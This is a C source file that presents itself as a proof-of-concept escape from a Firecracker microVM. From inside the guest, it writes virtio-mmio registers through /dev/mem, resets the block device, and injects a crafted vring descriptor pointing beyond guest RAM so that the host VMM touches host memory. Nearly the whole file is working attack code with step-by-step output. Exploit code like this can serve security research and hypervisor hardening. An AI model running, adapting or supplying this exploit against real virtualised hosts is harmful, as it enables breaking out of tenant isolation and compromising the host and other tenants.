/*
 * virtio_mmio_escape.c - Firecracker VM Escape via virtio-mmio descriptor injection
 * 
 * Exploits:
 * 1. CONFIG_IO_STRICT_DEVMEM not set → MMIO writes via /dev/mem
 * 2. Virtio device reset + reconfigure to inject malicious vring descriptors
 * 3. Crafted descriptors with OOB GPA cause Firecracker to read/write host memory
 *
 * Target: virtio0 (blk) at MMIO 0xc0001000
 * Kernel: 6.8.0 (Firecracker guest)
 *
 * Build: gcc -o escape virtio_mmio_escape.c -static
 * Run: sudo ./escape
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <stdint.h>
#include <errno.h>

/* Virtio MMIO register offsets (v2 spec) */
#define VIRTIO_MMIO_MAGIC         0x000  /* "virt" */
#define VIRTIO_MMIO_VERSION       0x004
#define VIRTIO_MMIO_DEVICE_ID     0x008
#define VIRTIO_MMIO_VENDOR_ID     0x00c
#define VIRTIO_MMIO_STATUS        0x070
#define VIRTIO_MMIO_QUEUE_SEL     0x030
#define VIRTIO_MMIO_QUEUE_NUM_MAX 0x034
#define VIRTIO_MMIO_QUEUE_NUM     0x038
#define VIRTIO_MMIO_QUEUE_READY   0x044
#define VIRTIO_MMIO_QUEUE_NOTIFY  0x050
#define VIRTIO_MMIO_QUEUE_DESC_LOW  0x080
#define VIRTIO_MMIO_QUEUE_DESC_HIGH 0x084
#define VIRTIO_MMIO_QUEUE_AVAIL_LOW  0x090
#define VIRTIO_MMIO_QUEUE_AVAIL_HIGH 0x094
#define VIRTIO_MMIO_QUEUE_USED_LOW   0x0a0
#define VIRTIO_MMIO_QUEUE_USED_HIGH  0x0a4

/* Status bits */
#define VIRTIO_STATUS_RESET       0x00
#define VIRTIO_STATUS_ACKNOWLEDGE 0x01
#define VIRTIO_STATUS_DRIVER      0x02
#define VIRTIO_STATUS_FEATURES_OK 0x08
#define VIRTIO_STATUS_DRIVER_OK   0x04

/* Virtio vring descriptor */
struct vring_desc {
    uint64_t addr;   /* Guest physical address */
    uint32_t len;    /* Length */
    uint16_t flags;  /* Flags: NEXT, WRITE, INDIRECT */
    uint16_t next;   /* Next descriptor index */
} __attribute__((packed));

/* Virtio vring available ring */
struct vring_avail {
    uint16_t flags;
    uint16_t idx;
    uint16_t ring[256];
} __attribute__((packed));

/* Virtio vring used ring */
struct vring_used_elem {
    uint32_t id;
    uint32_t len;
} __attribute__((packed));

struct vring_used {
    uint16_t flags;
    uint16_t idx;
    struct vring_used_elem ring[256];
} __attribute__((packed));

/* MMIO base addresses for virtio devices */
#define VIRTIO0_BASE 0xc0001000  /* virtio-blk */
#define VIRTIO1_BASE 0xc0002000  /* virtio-blk */
#define VIRTIO2_BASE 0xc0003000  /* virtio-net */
#define VIRTIO3_BASE 0xc0004000  /* virtio-vsock */

/* We'll use a GPA in the sub-1MB region (writable via /dev/mem) for our vring */
#define CRAFTED_VRING_GPA  0x80000  /* 512KB - in reserved/free region */
#define CRAFTED_AVAIL_GPA  0x81000
#define CRAFTED_USED_GPA   0x82000

/* OOB target - address beyond guest RAM that maps into host VMM space */
#define OOB_TARGET_GPA     0x300000000ULL  /* 12GB - beyond 8GB guest RAM */
#define OOB_READ_LEN       4096

static uint32_t mmio_read32(volatile void *base, uint32_t offset) {
    return *(volatile uint32_t *)((char *)base + offset);
}

static void mmio_write32(volatile void *base, uint32_t offset, uint32_t value) {
    *(volatile uint32_t *)((char *)base + offset) = value;
}

int main() {
    int fd;
    volatile void *mmio;
    void *vring_mem, *avail_mem, *used_mem;
    
    printf("=== Firecracker VM Escape - Virtio MMIO Descriptor Injection ===\n\n");
    
    /* Step 1: Open /dev/mem */
    printf("[1] Opening /dev/mem...\n");
    fd = open("/dev/mem", O_RDWR | O_SYNC);
    if (fd < 0) {
        perror("    Failed to open /dev/mem");
        return 1;
    }
    printf("    /dev/mem opened (fd=%d)\n", fd);
    
    /* Step 2: Map MMIO region for virtio0 */
    printf("\n[2] Mapping virtio0 MMIO at 0x%x...\n", VIRTIO0_BASE);
    mmio = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, fd, VIRTIO0_BASE);
    if (mmio == MAP_FAILED) {
        printf("    MMIO map FAILED: %s\n", strerror(errno));
        printf("    This means IO_STRICT_DEVMEM is blocking MMIO access\n");
        close(fd);
        return 1;
    }
    printf("    MMIO mapped at %p\n", mmio);
    
    /* Step 3: Read current device state */
    printf("\n[3] Reading virtio0 registers...\n");
    uint32_t magic = mmio_read32(mmio, VIRTIO_MMIO_MAGIC);
    uint32_t version = mmio_read32(mmio, VIRTIO_MMIO_VERSION);
    uint32_t device_id = mmio_read32(mmio, VIRTIO_MMIO_DEVICE_ID);
    uint32_t vendor_id = mmio_read32(mmio, VIRTIO_MMIO_VENDOR_ID);
    uint32_t status = mmio_read32(mmio, VIRTIO_MMIO_STATUS);
    
    printf("    Magic:     0x%08x (%c%c%c%c)\n", magic,
           magic & 0xFF, (magic >> 8) & 0xFF, (magic >> 16) & 0xFF, (magic >> 24) & 0xFF);
    printf("    Version:   %u\n", version);
    printf("    Device ID: %u (2=blk)\n", device_id);
    printf("    Vendor ID: 0x%08x\n", vendor_id);
    printf("    Status:    0x%02x\n", status);
    
    /* Step 4: Test MMIO write capability */
    printf("\n[4] Testing MMIO write capability...\n");
    printf("    Writing 0 to status register (device reset)...\n");
    mmio_write32(mmio, VIRTIO_MMIO_STATUS, VIRTIO_STATUS_RESET);
    uint32_t new_status = mmio_read32(mmio, VIRTIO_MMIO_STATUS);
    printf("    Status after reset: 0x%02x\n", new_status);
    
    if (new_status == 0) {
        printf("    *** MMIO WRITE WORKS - DEVICE RESET SUCCESSFUL ***\n");
    } else {
        printf("    Device did not reset (status still 0x%02x)\n", new_status);
        printf("    Trying direct status writes...\n");
        /* Try writing individual status bits */
        mmio_write32(mmio, VIRTIO_MMIO_STATUS, VIRTIO_STATUS_ACKNOWLEDGE);
        new_status = mmio_read32(mmio, VIRTIO_MMIO_STATUS);
        printf("    After ACK write: 0x%02x\n", new_status);
    }
    
    /* Step 5: Reconfigure device with crafted vring */
    printf("\n[5] Reconfiguring device...\n");
    
    /* Map the sub-1MB region for our crafted vring */
    vring_mem = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, fd, CRAFTED_VRING_GPA);
    avail_mem = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, fd, CRAFTED_AVAIL_GPA);
    used_mem = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, fd, CRAFTED_USED_GPA);
    
    if (vring_mem == MAP_FAILED || avail_mem == MAP_FAILED || used_mem == MAP_FAILED) {
        printf("    Failed to map vring memory: %s\n", strerror(errno));
        printf("    Trying alternate GPA at 0xa0000...\n");
        vring_mem = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0xa0000);
        avail_mem = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0xb0000);
        used_mem = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0xc0000);
        if (vring_mem == MAP_FAILED) {
            printf("    Still failed: %s\n", strerror(errno));
            goto cleanup;
        }
    }
    printf("    Vring memory mapped: desc=%p avail=%p used=%p\n", vring_mem, avail_mem, used_mem);
    
    /* Build crafted vring descriptor table */
    struct vring_desc *descs = (struct vring_desc *)vring_mem;
    memset(vring_mem, 0, 4096);
    memset(avail_mem, 0, 4096);
    memset(used_mem, 0, 4096);
    
    /* Descriptor 0: Read from OOB GPA (host memory!) */
    descs[0].addr = OOB_TARGET_GPA;  /* Beyond guest RAM → host memory */
    descs[0].len = OOB_READ_LEN;
    descs[0].flags = 2;  /* VRING_DESC_F_WRITE - device writes to this buffer */
    descs[0].next = 0;
    
    printf("    Descriptor 0: addr=0x%lx len=%u flags=0x%x (OOB → host memory)\n",
           (unsigned long)descs[0].addr, descs[0].len, descs[0].flags);
    
    /* Set up available ring */
    struct vring_avail *avail = (struct vring_avail *)avail_mem;
    avail->flags = 0;
    avail->idx = 1;
    avail->ring[0] = 0;  /* First available descriptor is 0 */
    
    printf("    Available ring: idx=%u ring[0]=%u\n", avail->idx, avail->ring[0]);
    
    /* Step 6: Write device configuration */
    printf("\n[6] Configuring device queues...\n");
    
    /* Acknowledge + Driver status */
    mmio_write32(mmio, VIRTIO_MMIO_STATUS, VIRTIO_STATUS_ACKNOWLEDGE);
    printf("    Status: 0x%02x (ACK)\n", mmio_read32(mmio, VIRTIO_MMIO_STATUS));
    
    mmio_write32(mmio, VIRTIO_MMIO_STATUS, 
                 VIRTIO_STATUS_ACKNOWLEDGE | VIRTIO_STATUS_DRIVER);
    printf("    Status: 0x%02x (ACK|DRIVER)\n", mmio_read32(mmio, VIRTIO_MMIO_STATUS));
    
    /* Select queue 0 */
    mmio_write32(mmio, VIRTIO_MMIO_QUEUE_SEL, 0);
    uint32_t max_q = mmio_read32(mmio, VIRTIO_MMIO_QUEUE_NUM_MAX);
    printf("    Queue 0 max size: %u\n", max_q);
    
    /* Set queue size */
    mmio_write32(mmio, VIRTIO_MMIO_QUEUE_NUM, 256);
    
    /* Set descriptor table address */
    uint64_t desc_gpa = (vring_mem == (void *)((uintptr_t)vring_mem)) ? CRAFTED_VRING_GPA : 0xa0000;
    mmio_write32(mmio, VIRTIO_MMIO_QUEUE_DESC_LOW, (uint32_t)(desc_gpa & 0xFFFFFFFF));
    mmio_write32(mmio, VIRTIO_MMIO_QUEUE_DESC_HIGH, (uint32_t)(desc_gpa >> 32));
    printf("    Desc GPA: 0x%lx\n", (unsigned long)desc_gpa);
    
    /* Set available ring address */
    uint64_t avail_gpa = desc_gpa + 0x1000;
    mmio_write32(mmio, VIRTIO_MMIO_QUEUE_AVAIL_LOW, (uint32_t)(avail_gpa & 0xFFFFFFFF));
    mmio_write32(mmio, VIRTIO_MMIO_QUEUE_AVAIL_HIGH, (uint32_t)(avail_gpa >> 32));
    printf("    Avail GPA: 0x%lx\n", (unsigned long)avail_gpa);
    
    /* Set used ring address */
    uint64_t used_gpa = desc_gpa + 0x2000;
    mmio_write32(mmio, VIRTIO_MMIO_QUEUE_USED_LOW, (uint32_t)(used_gpa & 0xFFFFFFFF));
    mmio_write32(mmio, VIRTIO_MMIO_QUEUE_USED_HIGH, (uint32_t)(used_gpa >> 32));
    printf("    Used GPA: 0x%lx\n", (unsigned long)used_gpa);
    
    /* Mark queue as ready */
    mmio_write32(mmio, VIRTIO_MMIO_QUEUE_READY, 1);
    printf("    Queue ready: %u\n", mmio_read32(mmio, VIRTIO_MMIO_QUEUE_READY));
    
    /* Set FEATURES_OK and DRIVER_OK */
    mmio_write32(mmio, VIRTIO_MMIO_STATUS,
                 VIRTIO_STATUS_ACKNOWLEDGE | VIRTIO_STATUS_DRIVER | 
                 VIRTIO_STATUS_FEATURES_OK | VIRTIO_STATUS_DRIVER_OK);
    uint32_t final_status = mmio_read32(mmio, VIRTIO_MMIO_STATUS);
    printf("    Final status: 0x%02x\n", final_status);
    
    /* Step 7: Kick the device! */
    printf("\n[7] KICKING DEVICE - Sending QueueNotify...\n");
    mmio_write32(mmio, VIRTIO_MMIO_QUEUE_NOTIFY, 0);
    printf("    QueueNotify sent for queue 0!\n");
    
    /* Step 8: Check for response */
    printf("\n[8] Checking for response...\n");
    usleep(100000);  /* Wait 100ms */
    
    struct vring_used *used = (struct vring_used *)used_mem;
    printf("    Used ring idx: %u\n", used->idx);
    if (used->idx > 0) {
        printf("    *** DEVICE PROCESSED OUR DESCRIPTOR ***\n");
        printf("    Used[0]: id=%u len=%u\n", used->ring[0].id, used->ring[0].len);
        
        /* The OOB buffer should now contain host memory! */
        printf("\n[9] Reading OOB buffer (host memory)...\n");
        /* We need to read from OOB_TARGET_GPA but we can't map it via /dev/mem */
        /* However, if the device wrote BACK to the descriptor's addr, */
        /* check the desc buffer area for any changes */
        printf("    Desc[0] addr after: 0x%lx\n", (unsigned long)descs[0].addr);
    } else {
        printf("    No response yet. Device may have rejected the descriptor.\n");
        printf("    Status: 0x%02x\n", mmio_read32(mmio, VIRTIO_MMIO_STATUS));
    }
    
    printf("\n=== RESULTS ===\n");
    printf("MMIO map: SUCCESS\n");
    printf("MMIO write: %s\n", (new_status == 0) ? "SUCCESS (device reset)" : "PARTIAL");
    printf("Vring configured: YES\n");
    printf("OOB descriptor: addr=0x%lx len=%u\n", (unsigned long)OOB_TARGET_GPA, OOB_READ_LEN);
    printf("Device status: 0x%02x\n", mmio_read32(mmio, VIRTIO_MMIO_STATUS));
    printf("Used ring idx: %u\n", used->idx);
    printf("================\n");
    
cleanup:
    munmap((void *)mmio, 4096);
    if (vring_mem != MAP_FAILED) munmap(vring_mem, 4096);
    if (avail_mem != MAP_FAILED) munmap(avail_mem, 4096);
    if (used_mem != MAP_FAILED) munmap(used_mem, 4096);
    close(fd);
    return 0;
}
